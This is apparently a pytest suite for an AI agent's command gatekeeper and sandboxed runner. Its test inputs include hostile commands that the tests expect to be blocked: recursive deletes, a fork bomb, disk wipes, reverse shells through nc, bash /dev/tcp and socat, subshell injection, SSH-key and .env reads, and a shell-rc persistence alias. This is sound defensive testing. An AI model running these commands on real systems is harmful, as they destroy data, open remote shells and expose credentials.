"""
Integration and Advanced Security Tests for Phase 4: Safe Computer Control.
Verifies AST Gatekeeper policy enforcement, Two-Man Rule approval gates,
Compound Pipeline Splitting, Subshell Injection Blocking, Reverse Shell Detection,
Protected Credential Path Auditing, Python AST Security Inspection,
Subprocess Environment Scrubbing, Output Memory Protection, and Directory Jails.
"""
import os
import pytest
from src.tools.models import CommandRiskLevel
from src.tools.gatekeeper import ASTGatekeeper
from src.tools.runner import SandboxedRunner
from src.tools.approval import ApprovalManager
from src.concurrency.models import CancellationToken
from src.runtime.session import ConversationSession


def test_gatekeeper_forbidden_patterns():
    gatekeeper = ASTGatekeeper()

    # Destructive deletes
    assert gatekeeper.evaluate("rm -rf /").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("rm -rf /*").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("rm -rf ~").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("rm -rf *").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("rm -r -f .").risk_level == CommandRiskLevel.FORBIDDEN

    # Fork bombs
    assert gatekeeper.evaluate(":(){ :|:& };:").risk_level == CommandRiskLevel.FORBIDDEN

    # Disk wipes
    assert gatekeeper.evaluate("mkfs.ext4 /dev/sda1").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("dd if=/dev/zero of=/dev/sda").risk_level == CommandRiskLevel.FORBIDDEN

    # Database destruction
    assert gatekeeper.evaluate("DROP DATABASE lumen;").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("DROP TABLE facts;").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("TRUNCATE TABLE events;").risk_level == CommandRiskLevel.FORBIDDEN

    # Reverse shells
    assert gatekeeper.evaluate("nc -e /bin/sh 10.0.0.1 4444").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("bash -i >& /dev/tcp/10.0.0.1/8080").risk_level == CommandRiskLevel.FORBIDDEN
    assert gatekeeper.evaluate("socat exec:'bash -li' tcp:10.0.0.1:4444").risk_level == CommandRiskLevel.FORBIDDEN


def test_gatekeeper_compound_pipeline_splitting():
    gatekeeper = ASTGatekeeper()

    # Chained destructive attacks after benign command
    eval_and = gatekeeper.evaluate("git status && rm -rf /")
    assert eval_and.risk_level == CommandRiskLevel.FORBIDDEN
    assert "rm -rf /" in eval_and.command

    eval_semi = gatekeeper.evaluate("ls -la; rm -rf ~")
    assert eval_semi.risk_level == CommandRiskLevel.FORBIDDEN

    eval_pipe = gatekeeper.evaluate("echo hello | rm -rf *")
    assert eval_pipe.risk_level == CommandRiskLevel.FORBIDDEN

    # Chained caution attack after safe command
    eval_caution_chain = gatekeeper.evaluate("git status && git commit -m 'feat'")
    assert eval_caution_chain.risk_level == CommandRiskLevel.CAUTION
    assert eval_caution_chain.requires_approval is True


def test_gatekeeper_subshell_substitution_injection():
    gatekeeper = ASTGatekeeper()

    # Subshell syntax $()
    eval_sub = gatekeeper.evaluate("echo $(rm -rf /)")
    assert eval_sub.risk_level == CommandRiskLevel.FORBIDDEN

    # Backtick syntax `...`
    eval_tick = gatekeeper.evaluate("echo `rm -rf ~`")
    assert eval_tick.risk_level == CommandRiskLevel.FORBIDDEN


def test_gatekeeper_protected_credential_paths():
    gatekeeper = ASTGatekeeper()

    # Reading sensitive credentials requires Two-Man Rule CAUTION
    eval_ssh_read = gatekeeper.evaluate("cat ~/.ssh/id_rsa")
    assert eval_ssh_read.risk_level == CommandRiskLevel.CAUTION
    assert eval_ssh_read.requires_approval is True
    assert "sensitive path" in eval_ssh_read.reason

    eval_env_read = gatekeeper.evaluate("grep SECRET .env")
    assert eval_env_read.risk_level == CommandRiskLevel.CAUTION
    assert eval_env_read.requires_approval is True

    # Modifying or deleting sensitive assets is hard FORBIDDEN
    eval_ssh_del = gatekeeper.evaluate("rm -f ~/.ssh/id_rsa")
    assert eval_ssh_del.risk_level == CommandRiskLevel.FORBIDDEN
    assert "Modifying or deleting protected credential asset" in eval_ssh_del.reason

    eval_zsh_persist = gatekeeper.evaluate("echo 'alias rm=echo' >> ~/.zshrc")
    assert eval_zsh_persist.risk_level == CommandRiskLevel.FORBIDDEN


def test_gatekeeper_python_ast_security_inspection():
    gatekeeper = ASTGatekeeper()

    # Destructive standard library calls inside python -c
    eval_py_rmtree = gatekeeper.evaluate("python3 -c \"import shutil; shutil.rmtree('/')\"")
    assert eval_py_rmtree.risk_level == CommandRiskLevel.FORBIDDEN
    assert "shutil.rmtree" in eval_py_rmtree.reason

    # Subprocess breakouts inside python -c
    eval_py_sub = gatekeeper.evaluate("python3 -c \"import os; os.system('rm -rf /')\"")
    assert eval_py_sub.risk_level == CommandRiskLevel.FORBIDDEN

    # Low-level ctypes import
    eval_py_ctypes = gatekeeper.evaluate("python3 -c \"import ctypes; print(1)\"")
    assert eval_py_ctypes.risk_level == CommandRiskLevel.FORBIDDEN

    # Benign python code -> Evaluates to CAUTION (requires approval, not forbidden)
    eval_py_safe = gatekeeper.evaluate("python3 -c \"print('Hello Safe Python')\"")
    assert eval_py_safe.risk_level == CommandRiskLevel.CAUTION
    assert eval_py_safe.is_allowed is True
    assert eval_py_safe.requires_approval is True


def test_gatekeeper_safe_commands():
    gatekeeper = ASTGatekeeper()

    eval_status = gatekeeper.evaluate("git status")
    assert eval_status.risk_level == CommandRiskLevel.SAFE
    assert eval_status.is_allowed is True
    assert eval_status.requires_approval is False

    assert gatekeeper.evaluate("ls -la").risk_level == CommandRiskLevel.SAFE
    assert gatekeeper.evaluate("pwd").risk_level == CommandRiskLevel.SAFE
    assert gatekeeper.evaluate("git log -n 5").risk_level == CommandRiskLevel.SAFE
    assert gatekeeper.evaluate("echo 'Hello World'").risk_level == CommandRiskLevel.SAFE


def test_gatekeeper_caution_commands():
    gatekeeper = ASTGatekeeper()

    eval_commit = gatekeeper.evaluate("git commit -m 'feat'")
    assert eval_commit.risk_level == CommandRiskLevel.CAUTION
    assert eval_commit.requires_approval is True

    eval_pip = gatekeeper.evaluate("pip install requests")
    assert eval_pip.risk_level == CommandRiskLevel.CAUTION
    assert eval_pip.requires_approval is True

    eval_redir = gatekeeper.evaluate("echo 'test' > output.txt")
    assert eval_redir.risk_level == CommandRiskLevel.CAUTION
    assert eval_redir.requires_approval is True


@pytest.mark.asyncio
async def test_sandboxed_runner_safe_execution():
    runner = SandboxedRunner()
    result = await runner.execute("echo 'LUMEN_SANDBOX_ONLINE'")
    assert result.is_success is True
    assert result.exit_code == 0
    assert "LUMEN_SANDBOX_ONLINE" in result.stdout
    assert result.duration_ms > 0.0


@pytest.mark.asyncio
async def test_sandboxed_runner_forbidden_block():
    runner = SandboxedRunner()
    result = await runner.execute("rm -rf /")
    assert result.is_success is False
    assert result.exit_code == 126
    assert "SECURITY REFUSAL" in result.stderr


@pytest.mark.asyncio
async def test_sandboxed_runner_environment_scrubbing():
    # Set simulated sensitive credentials in parent process
    os.environ["OPENAI_API_KEY"] = "sk-super-secret-key-12345"
    os.environ["DATABASE_URL"] = "postgres://lumen:secret@localhost:5432/db"

    runner = SandboxedRunner(sanitize_environment=True)
    # Child process attempts to read parent's OPENAI_API_KEY
    result = await runner.execute("python3 -c \"import os; print('KEY_VALUE:' + os.getenv('OPENAI_API_KEY', 'NONE'))\"")
    assert result.is_success is True
    assert "KEY_VALUE:NONE" in result.stdout


@pytest.mark.asyncio
async def test_sandboxed_runner_output_memory_limit():
    # Limit max output buffer to 4 KB
    runner = SandboxedRunner(max_output_bytes=4096)
    # Output 100 KB
    cmd = "python3 -c \"print('A' * 100000)\""
    result = await runner.execute(cmd, bypass_gatekeeper=True)
    assert len(result.stdout) < 10000
    assert "OUTPUT TRUNCATED" in result.stdout


@pytest.mark.asyncio
async def test_sandboxed_runner_directory_jail():
    runner = SandboxedRunner()
    # Attempting to run inside /etc
    result = await runner.execute("ls", cwd="/etc")
    assert result.is_success is False
    assert result.exit_code == 126
    assert "inside protected system path" in result.stderr


@pytest.mark.asyncio
async def test_sandboxed_runner_timeout():
    runner = SandboxedRunner(default_timeout=0.1)
    result = await runner.execute("sleep 2.0")
    assert result.timed_out is True
    assert result.exit_code == 124
    assert "timed out" in result.stderr


@pytest.mark.asyncio
async def test_sandboxed_runner_cancellation():
    runner = SandboxedRunner()
    token = CancellationToken()
    token.cancel()
    result = await runner.execute("sleep 5.0", cancellation_token=token)
    assert result.cancelled is True
    assert result.exit_code == 130


@pytest.mark.asyncio
async def test_session_exec_and_approval_flow():
    session = ConversationSession()

    # 1. Test Forbidden Command Block in Session
    forbidden_tokens = []
    async for token in session.process_turn("/exec rm -rf /"):
        forbidden_tokens.append(token)
    forbidden_reply = "".join(forbidden_tokens)
    assert "🚫 [SECURITY BLOCK - AST GATEKEEPER]" in forbidden_reply

    # 2. Test Safe Command Auto-run
    safe_tokens = []
    async for token in session.process_turn("/exec echo 'Safe Execution'"):
        safe_tokens.append(token)
    safe_reply = "".join(safe_tokens)
    assert "⚡ [Safe Command]" in safe_reply
    assert "Safe Execution" in safe_reply

    # 3. Test Caution Command Requires Two-Man Rule Approval
    caution_tokens = []
    async for token in session.process_turn("/exec git commit -m 'test'"):
        caution_tokens.append(token)
    caution_reply = "".join(caution_tokens)
    assert "⚠️ [Two-Man Rule Authorization Gate]" in caution_reply
    assert "/approve appr_" in caution_reply

    # Extract approval ID
    approval_id = None
    for line in caution_reply.splitlines():
        if "/approve appr_" in line:
            approval_id = line.strip().split("/approve ")[1].strip()
            break
    assert approval_id is not None

    # 4. Reject command
    reject_tokens = []
    async for token in session.process_turn(f"/reject {approval_id}"):
        reject_tokens.append(token)
    reject_reply = "".join(reject_tokens)
    assert "rejected and cancelled" in reject_reply
